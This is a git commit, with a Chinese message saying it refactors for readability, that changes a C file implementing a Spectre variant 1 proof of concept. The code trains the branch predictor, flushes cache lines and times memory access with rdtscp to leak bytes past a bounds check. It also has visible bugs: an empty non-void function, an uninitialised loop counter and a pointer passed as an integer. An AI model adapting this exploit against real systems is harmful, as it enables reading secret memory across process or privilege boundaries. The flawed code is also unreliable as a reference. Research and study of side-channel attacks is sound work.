3a7985d35606d2cf79599db10688b8969238246b
CklMin <1125290220@qq.com>
2018-01-11 00:18:03 +0800

    重构代码，增加阅读性

--- main.c
+++ main.c
@@ -3,87 +3,72 @@
 
 
 
-char buf[257 * 4096];
-char array[160] = {255,255,255,255,255};
+unsigned char buf[256 * 4096];
+unsigned char base[1] = {0};		// 目标地址的base数组
 int array_size = 16;
 
 volatile char value_tmp = 0;
+char *str = "ABCDEFG";
+
 
 void victim_function(size_t x){
 	if(x < array_size)
-		value_tmp &= buf[array[x] * 4096];
+		value_tmp = buf[base[x] * 4096];
 } 
 
-int main(){
-	int tmp;
+unsigned char __readMemoryByCache(size_t addr){
+	
+}
+/*
+	addr: 需要读取的地址
+	len：读取的字节数
+*/
+void readMemoryByCache(size_t addr, int len){
 	int junk = 0;
 	int time1 = 0, time2 = 0;
-	char test = 100;
-	char *addr;
-	static int result[257];
-	void (*p)(size_t) = victim_function;
-
-	int malicious_x = (char *)0xFFC00000 - array;
-	int training_x = 5;
-	int j, x;
-
-	// printf("%c\n", array[malicious_x]);
-	printf("%d\n", malicious_x);
-	scanf("%d", &tmp);
-
-	for(int j = 0; j < 257; j++)
-		_mm_clflush(&buf[j * 4096]);
-
-	for (volatile int z = 0; z < 100; z++) {}
-
-	for (j = 29; j >= 0; j--) {
+	char *addr_tmp;
+	static int result[256];
+	
+	size_t offset_x;		// 目标地址基于base数组的偏移量
+	size_t training_x = 0, x;		// 训练参数 防止CPU分支预测正确
+	offset_x = (unsigned char *)addr - base;
+	
+	for(int index = 0; index < len; index++){
+		for(int i; i < 256; i++)
+			_mm_clflush(&buf[i * 4096]);
+		
+		// 读取非法地址信息至L1 cache
+		for (int j = 29; j >= 0; j--) {
             _mm_clflush(&array_size);  // 清空 array1_size 的缓存
-            /*
-                100 次内存取值用作延时，确保 cache 页全部换出
-            */
+ 
             for (volatile int z = 0; z < 100; z++) {}
-            /*
-                在这一步:
-                j % 6 =  0 则 x = 0xFFFF0000
-                j % 6 != 0 则 x = 0x00000000
-                Avoid jumps in case those tip off the branch predictor
-            */
             x = ((j % 6) - 1) & ~0xFFFF;
-            /*
-                到这里:
-                j % 6 =  0 则 x = 0xFFFFFFFF
-                j % 6 != 0 则 x = 0x00000000
-            */
             x = (x | (x >> 16));
-            /*
-                最后:
-                j % 6 =  0 则 x = malicious_x
-                j % 6 != 0 则 x = training_x
-            */
-            x = training_x ^ (x & (malicious_x ^ training_x));
-            /*
-                调用触发 cache 代码
-                共计触发 5 次，j = 24、18、12、6、0时，都会触发分支预测
-            */
+            x = training_x ^ (x & (offset_x ^ training_x));
             victim_function(x);
         }
-
-
-	for(int i = 0; i < 257; i ++){
-		addr = &buf[i * 4096];
-		time1 = __rdtscp(&junk);
-		junk = *addr;
-		time2 = __rdtscp(&junk) - time1;
-		_mm_clflush(&buf[i * 4096]);
-		result[i] = time2;
-		_mm_clflush(&result[i]);
+		
+		// 获取非法地址信息
+		for(int i = 0; i < 256; i ++){
+			addr_tmp = &buf[i * 4096];
+			time1 = __rdtscp(&junk);
+			junk = *addr_tmp;
+			time2 = __rdtscp(&junk) - time1;
+			_mm_clflush(&buf[i * 4096]);
+			result[i] = time2;
+			_mm_clflush(&result[i]);
+		}
+		
+		// 打印非法地址信息
+		for(int i = 0; i < 256; i++){
+			if(result[i] < 170)
+				printf("the caceh[%d] time was %d\n", i, result[i]);
+		}
+		
+		offset_x ++;
 	}
+}
 
-	for(int i = 0; i < 257; i++){
-		if(result[i] < 200)
-			printf("the caceh[%d] time was %d\n", i, result[i]);
-	}
-
-	// printf("%d\n", buf[255 * 4096]);
-	// printf("%d\n", buf[11 * 4096]);
+int main(){
+	readMemoryByCache(str, 7);
 }
